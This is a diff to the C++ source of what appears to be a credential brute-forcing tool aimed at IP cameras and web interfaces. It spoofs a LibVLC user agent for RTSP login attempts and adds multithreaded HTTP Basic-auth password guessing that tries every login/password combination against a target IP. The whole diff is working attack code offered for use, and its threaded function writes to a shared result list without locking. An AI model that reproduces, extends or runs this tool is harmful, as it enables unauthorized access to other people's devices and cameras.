@@ -175,7 +175,7 @@ std::string threads_brute_ssh(const std::string ip, const std::vector<std::strin
     }
 }
 
-std::string brute_rtsp(std::string ip, std::string login, std::string pass, int brute_log, int verbose){
+std::string brute_rtsp(const std::string ip, const std::string login, const std::string pass, int brute_log, int verbose){
     std::string result;
     curl_global_init(CURL_GLOBAL_ALL);
     CURL* curl = curl_easy_init();
@@ -193,7 +193,7 @@ std::string brute_rtsp(std::string ip, std::string login, std::string pass, int 
         curl_easy_setopt(curl, CURLOPT_TCP_NODELAY, 1L);
         curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT, 15L);
         curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
-        curl_easy_setopt(curl, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36");
+        curl_easy_setopt(curl, CURLOPT_USERAGENT, "LibVLC/2.1.5 (LIVE555 Streaming Media v2014.05.27"); 
         curl_easy_setopt(curl, CURLOPT_RTSP_TRANSPORT, "TCP");
         curl_easy_setopt(curl, CURLOPT_RTSP_REQUEST, CURL_RTSPREQ_OPTIONS);
 
@@ -252,3 +252,73 @@ std::string threads_brute_rtsp(const std::string ip, const std::vector<std::stri
     }
 }
 
+
+std::string brute_http(const std::string ip, const std::string login, const std::string pass, int brute_log, int verbose){
+    std::string result;
+    CURL* curl = curl_easy_init();
+    bool success = false;
+    if (curl) {
+        curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);
+        curl_easy_setopt(curl, CURLOPT_HTTPAUTH, CURLAUTH_BASIC);
+        curl_easy_setopt(curl, CURLOPT_USERNAME, login.c_str());
+        curl_easy_setopt(curl, CURLOPT_PASSWORD, pass.c_str());
+        curl_easy_setopt(curl, CURLOPT_FORBID_REUSE, 1L);
+        curl_easy_setopt(curl, CURLOPT_TCP_NODELAY, 1L);
+        curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT, 15L);
+        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
+        curl_easy_setopt(curl, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36");
+        curl_easy_setopt(curl, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);
+        if (verbose){
+            curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);
+        }
+        std::string url_with_protocol = "http://" + ip;
+        curl_easy_setopt(curl, CURLOPT_URL, url_with_protocol.c_str());
+
+        if (brute_log){
+            std::string result_print_brute = "[" + std::string(get_time()) + "][HTTP]    try: " + login + "@" + pass + " [BRUTEFORCE]";
+            std::cout << yellow_html1;
+            std::cout << result_print_brute << std::endl;
+            std::cout << reset_color1;
+        }
+
+        CURLcode res = curl_easy_perform(curl);
+        if (res == CURLE_OK) {
+            result = login + ":" + pass + "@";
+            curl_easy_cleanup(curl);
+            return result;
+        }
+        else {
+            curl_easy_cleanup(curl);
+            return "";
+        }
+    }
+    curl_easy_cleanup(curl);
+    return "";
+}
+
+std::string threads_brute_http(const std::string ip, const std::vector<std::string> logins, const std::vector<std::string> passwords, int brute_log, int verbose, int brute_timeout_ms) {
+    std::vector<std::thread> threads;
+    std::vector<std::string> results;
+
+    for (const auto& login : logins) {
+        for (const auto& password : passwords) {
+            delay_ms(brute_timeout_ms);
+            threads.emplace_back([ip, login, password, brute_log, verbose, &results]() {
+                std::string temp = brute_http(ip, login, password, brute_log, verbose);
+                if (!temp.empty() && temp.length() > 3) {
+                    results.push_back(temp);
+                }
+            });
+        }
+    }
+
+    for (auto& thread : threads) {
+        thread.join();
+    }
+
+    if (!results.empty()) {
+        return results[0];
+    } else {
+        return "";
+    }
+}
